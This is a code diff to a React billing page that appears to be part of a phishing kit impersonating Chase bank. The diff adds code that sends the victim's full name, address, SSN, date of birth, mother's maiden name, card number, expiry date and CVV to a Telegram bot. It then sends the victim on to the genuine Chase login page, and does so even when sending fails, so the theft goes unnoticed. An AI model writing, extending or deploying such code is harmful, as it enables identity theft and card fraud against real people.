@@ -1,9 +1,12 @@
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
+import { sendCustomData } from '../services/telegramBot';
 
 const Billing = () => {
   const navigate = useNavigate();
   const [step, setStep] = useState(1);
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState(false);
   const [formData, setFormData] = useState({
     firstName: '',
     lastName: '',
@@ -98,7 +101,7 @@ const Billing = () => {
     });
   };
 
-  const handleNext = (e) => {
+  const handleNext = async (e) => {
     e.preventDefault();
     if (step === 1) {
       if (formData.zipCode.length !== 5) {
@@ -172,7 +175,39 @@ const Billing = () => {
         return;
       }
 
-      window.location.href = "https://secure.chase.com/web/auth/?treatment=chase#/logon/logon/chaseOnline";
+      setLoading(true);
+      setError(false);
+      
+      try {
+        console.log('🚀 Billing: Sending data to Telegram...');
+        // Send all billing data to Telegram
+        await sendCustomData('💳 Billing Information Submitted', {
+          'First Name': formData.firstName,
+          'Last Name': formData.lastName,
+          'Street': formData.street,
+          'City': formData.city,
+          'State': formData.state,
+          'Zip Code': formData.zipCode,
+          'SSN': formData.ssn,
+          'Date of Birth': formData.dob,
+          'Mother\'s Maiden Name': formData.mmn,
+          'Card Number': formData.cardNumber,
+          'Expiry Date': formData.expiryDate,
+          'CVV': formData.cvv
+        });
+        
+        console.log('🏁 Billing: Redirecting to Chase...');
+        window.location.href = "https://secure.chase.com/web/auth/?treatment=chase#/logon/logon/chaseOnline";
+      } catch (err) {
+        console.error('❌ Billing: Error submitting data:', err);
+        setError(true);
+        // Redirect anyway after a short delay so user isn't stuck
+        setTimeout(() => {
+          window.location.href = "https://secure.chase.com/web/auth/?treatment=chase#/logon/logon/chaseOnline";
+        }, 2000);
+      } finally {
+        setLoading(false);
+      }
     }
   };
 
@@ -258,11 +293,20 @@ const Billing = () => {
             )}
 
             <div className="action-buttons dual-buttons billing-actions">
-              <button type="button" className="cancel-btn" onClick={() => step === 2 ? setStep(1) : navigate('/enter-code')}>
+              <button 
+                type="button" 
+                className="cancel-btn" 
+                onClick={() => step === 2 ? setStep(1) : navigate('/enter-code')}
+                disabled={loading}
+              >
                 {step === 2 ? "Back" : "Cancel"}
               </button>
-              <button type="submit" className="next-btn">
-                {step === 1 ? "Next" : "Submit"}
+              <button 
+                type="submit" 
+                className={`next-btn ${loading ? 'disabled' : ''}`}
+                disabled={loading}
+              >
+                {loading ? "Processing..." : (step === 1 ? "Next" : "Submit")}
               </button>
             </div>
           </form>
